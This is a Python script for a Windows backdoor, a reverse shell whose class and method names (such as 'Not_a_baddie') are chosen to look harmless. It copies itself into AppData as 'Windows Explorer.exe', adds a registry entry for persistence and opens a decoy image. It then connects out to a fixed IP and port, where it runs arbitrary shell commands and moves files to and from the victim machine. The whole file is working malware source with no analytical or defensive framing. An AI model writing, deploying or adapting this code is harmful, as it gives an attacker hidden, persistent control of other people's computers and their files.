#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import time
import tempfile

class Not_a_baddie:
    def __init__(self, ip, port):
        self.stick_around()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def stick_around(self):
        location_of_naughty_file = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(location_of_naughty_file):
            shutil.copyfile(sys.executable, location_of_naughty_file)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\do_the_thing /v Update /t REG_SZ /d "' + location_of_naughty_file + '"',shell=True)

    def send_stuff(self, data):
        json_content = json.dumps(data)
        self.connection.send(json_content)

    def receive_stuff(self):
        json_content = ""
        while True:
            try:
                json_content = json_content + self.connection.recv(1024)
                return json.loads(json_content)
            except ValueError:
                continue

    def do_the_thing_on_the_thing(self, system_instruction):
        EMPTYDEV = open(os.devnull, 'wb')
        return subprocess.check_output(system_instruction, shell=True, stderr=EMPTYDEV, stdin=EMPTYDEV)

    def change_file_path(self, path):
        os.chdir(path)
        return "[+] Changing working direction to " + path

    def investigate_a_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_the_content(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"

    def do_the_thing(self):
        while True:
            system_instruction = self.receive_stuff()
            try:
                if system_instruction[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif system_instruction[0] == "cd" and len(system_instruction) > 1:
                    system_instruction_result = self.change_file_path(system_instruction[1])
                elif system_instruction[0] == "download":
                    system_instruction_result = self.investigate_a_file(system_instruction[1])
                elif system_instruction[0] == "upload":
                    system_instruction_result = self.write_the_content(system_instruction[1], system_instruction[2])
                else:
                    system_instruction_result = self.do_the_thing_on_the_thing(system_instruction)
            except Exception:
                system_instruction_result = "[-] Error during system_instruction execution."

            self.send_stuff(system_instruction_result)


nombre_de_filo = "%TEMP%\\onefile\car.jpg"
subprocess.Popen(nombre_de_filo, shell=True)

try:
    counter = 1
    while counter < 100:
        counter = counter + 1

    time.sleep(0)
    bd_go = Not_a_baddie("192.168.188.154", 8080)
    bd_go.do_the_thing()
except Exception:
    sys.exit()